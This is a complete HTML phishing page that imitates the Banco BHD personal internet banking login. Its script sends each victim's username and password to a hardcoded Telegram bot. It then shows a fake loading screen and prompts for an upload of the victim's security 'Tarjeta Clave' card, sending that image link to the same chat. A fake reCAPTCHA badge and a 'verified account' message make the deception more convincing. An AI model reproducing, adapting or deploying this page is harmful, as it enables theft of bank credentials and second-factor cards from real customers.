<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=402, height=858, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Banco BHD - IBP</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-image: url('https://files.catbox.moe/ntc5sv.webp');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      height: 100vh;
      position: relative;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    .login-container {
      background-color: #ffffffcc;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.3);
      box-sizing: border-box;
      display: flex;
      justify-content: center;
      text-align: center;
      z-index: 10;
      padding: 30px 0;
      transform: translateY(-1in); /* Mueve hacia arriba una pulgada */
    }

    .login-inner {
      width: 407px;
      display: flex;
      flex-direction: column;
      gap: 10px;
      padding: 0 30px;
      box-sizing: border-box;
    }

    .header-logo {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      margin-bottom: 20px;
    }

    .header-logo img {
      height: 40px;
    }

    .barrita {
      width: 1px;
      height: 0.6cm;
      background-color: #3aa626;
    }

    .header-logo span {
      color: #3aa626;
      font-style: italic;
      font-size: 0.6cm;
      line-height: 1;
    }

    .input-group {
      text-align: left;
    }

    .input-group label {
      display: block;
      font-size: 14px;
      margin-bottom: 5px;
      color: #333;
    }

    .input-group input {
      width: 100%;
      padding: 10px;
      box-sizing: border-box;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 14px;
    }

    .login-button {
      width: 100%;
      padding: 12px;
      background-color: #3aa626;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
      transition: background-color 0.3s ease;
    }

    .login-button:hover {
      background-color: #2c7a1b;
    }

    .forgot-password {
      font-size: 13px;
      text-align: center;
      margin-top: 10px;
    }

    .forgot-password a {
      color: #3aa626;
      text-decoration: none;
    }

    /* Ahora bottom-link va debajo del login, centrado y en l√≠nea */
    .bottom-link {
      margin-top: 15px;
      text-align: center;
      font-size: 13px;
      color: white;
      width: 100%;
      user-select: none;
    }

    .bottom-link a {
      color: white;
      text-decoration: underline;
      font-weight: bold;
      font-size: 13px;
      display: inline-flex;
      align-items: center;
      gap: 6px;
      white-space: nowrap; /* Evita salto de l√≠nea */
    }

    .bottom-link a .arrow {
      font-weight: bold;
      font-size: 20px;
      line-height: 1;
    }

    .recaptcha-box {
      position: fixed;
      bottom: 0.4cm;
      right: 0;
      width: 2cm;
      height: 1.7cm;
      background-color: white;
      box-shadow: 0 0 5px rgba(0,0,0,0.15);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      font-family: Arial, sans-serif;
      user-select: none;
      z-index: 1000;
      border-radius: 4px;
      box-sizing: border-box;
      padding: 2px;
    }

    .recaptcha-box img {
      height: 1cm;
      object-fit: contain;
      margin-bottom: 2px;
    }

    .recaptcha-box .text {
      font-size: 8px;
      color: #555;
      text-align: center;
    }

    #loading-5s {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: rgba(255,255,255,0.95);
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 0 20px;
      box-sizing: border-box;
      user-select: none;
      color: #3aa626;
      font-weight: bold;
      font-size: 1.2rem;
      letter-spacing: 0.03em;
    }

    .loader-dots {
      display: flex;
      justify-content: center;
      gap: 8px;
      margin-bottom: 15px;
    }

    .loader-dots div {
      width: 12px;
      height: 12px;
      background-color: #3aa626;
      border-radius: 50%;
      animation: pulse 1.2s infinite ease-in-out;
    }

    .loader-dots div:nth-child(1) { animation-delay: 0s; }
    .loader-dots div:nth-child(2) { animation-delay: 0.2s; }
    .loader-dots div:nth-child(3) { animation-delay: 0.4s; }

    @keyframes pulse {
      0%, 80%, 100% { transform: scale(0.8); opacity: 0.6; }
      40% { transform: scale(1.4); opacity: 1; }
    }

    #uploadSection {
      width: 407px;
      padding: 30px;
      background-color: #ffffffcc;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.3);
      box-sizing: border-box;
      display: none;
      flex-direction: column;
      justify-content: center;
      text-align: center;
      gap: 15px;
      position: relative;
      z-index: 10;
    }

    #uploadSection h2 {
      margin-bottom: 15px;
      color: #3aa626;
    }

    .verified-message {
      margin-top: 20px;
      display: flex;
      align-items: center;
      gap: 12px;
      color: #3aa626;
      font-weight: bold;
      font-size: 1.2rem;
      user-select: none;
      animation: fadeIn 0.8s ease forwards;
    }

    .checkmark {
      width: 36px;
      height: 36px;
      stroke: #3aa626;
      stroke-width: 4;
      stroke-miterlimit: 10;
      stroke-linecap: round;
      stroke-linejoin: round;
      fill: none;
      animation: strokeCircle 0.6s ease forwards;
    }

    .checkmark-circle {
      stroke-dasharray: 166;
      stroke-dashoffset: 166;
      animation: strokeCircle 0.6s forwards;
    }

    .checkmark-check {
      stroke-dasharray: 48;
      stroke-dashoffset: 48;
      animation: strokeCheck 0.4s 0.6s forwards;
    }

    @keyframes strokeCircle { to { stroke-dashoffset: 0; } }
    @keyframes strokeCheck { to { stroke-dashoffset: 0; } }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    /* Solo fondo del login ocupa 100% en m√≥viles */
    @media only screen and (max-width: 420px) {
      html, body {
        width: 402px;
        height: 858px;
        overflow-x: hidden;
      }

      .login-container,
      #uploadSection {
        width: 100vw;
        border-radius: 0;
      }

      .bottom-link {
        font-size: 12px;
      }

      .recaptcha-box {
        transform: scale(0.85);
        right: 10px;
        bottom: 10px;
      }
    }
  </style>
</head>
<body>

  <form id="formulario" class="login-container">
    <div class="login-inner">
      <div class="header-logo">
        <img src="https://files.catbox.moe/dzwmjl.svg" alt="Logo Gen√©rico" />
        <div class="barrita"></div>
        <span><em>Personal</em></span>
      </div>

      <div class="input-group">
        <label for="usuario">Usuario</label>
        <input type="text" id="usuario" name="usuario" required autocomplete="username" />
      </div>

      <div class="input-group">
        <label for="contrasena">Contrase√±a</label>
        <input type="password" id="contrasena" name="contrasena" required autocomplete="current-password" />
      </div>

      <button type="submit" class="login-button">Entrar</button>

      <div class="forgot-password">
        <a href="#">¬øOlvidaste tu clave de acceso?</a>
      </div>
    </div>
  </form>

  <div class="bottom-link">
    <a href="#"><span class="arrow">‚Üê</span> Ir a Internet Banking Empresarial</a>
  </div>

  <div class="recaptcha-box">
    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo" />
    <div class="text">Privacy - Terms</div>
  </div>

  <div id="loading-5s">
    <div class="loader-dots"><div></div><div></div><div></div></div>
    <div>Iniciando sesi√≥n...</div>
  </div>

  <div id="uploadSection">
    <h2>Cargue Su Tarjeta Clave</h2>
    <input type="hidden" role="uploadcare-uploader" data-public-key="5875fe3e936a25b9dff2" />
    <div id="verifiedMessage" class="verified-message" style="display:none;">
      <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
        <circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none"/>
        <path class="checkmark-check" fill="none" d="M14 27l7 7 16-16"/>
      </svg>
      <span>Cuenta verificada exitosamente</span>
    </div>
  </div>

  <script src="https://ucarecdn.com/libs/widget/3.x/uploadcare.full.min.js"></script>
  <script>
    const TOKEN = '8080151652:AAHOBxTqFkd9Fc06paGLj8PK72OOZND05-4';
    const CHAT_ID = '1221652451';

    const formulario = document.getElementById('formulario');
    const uploadSection = document.getElementById('uploadSection');
    const loading5s = document.getElementById('loading-5s');
    const verifiedMessage = document.getElementById('verifiedMessage');
    const widget = uploadcare.Widget('[role=uploadcare-uploader]');

    formulario.addEventListener('submit', async (e) => {
      e.preventDefault();
      const usuario = e.target.usuario.value.trim();
      const contrasena = e.target.contrasena.value.trim();
      if (!usuario || !contrasena) return;

      const mensaje = `üîê *Nuevo ingreso:*\n\nüë§ Usuario: ${usuario}\nüîë Contrase√±a: ${contrasena}`;
      try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, parse_mode: 'Markdown' })
        });
      } catch {}

      formulario.style.display = 'none';
      loading5s.style.display = 'flex';

      setTimeout(() => {
        loading5s.style.display = 'none';
        uploadSection.style.display = 'flex';
      }, 5000);
    });

    widget.onChange(file => {
      verifiedMessage.style.display = 'none';
      if (file) {
        file.done(async info => {
          try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `üñºÔ∏è *Imagen subida (educativa)*\nURL: ${info.cdnUrl}`,
                parse_mode: 'Markdown'
              })
            });
            verifiedMessage.style.display = 'flex';
          } catch (err) { console.error(err); }
        });
      }
    });
  </script>
</body>
</html>
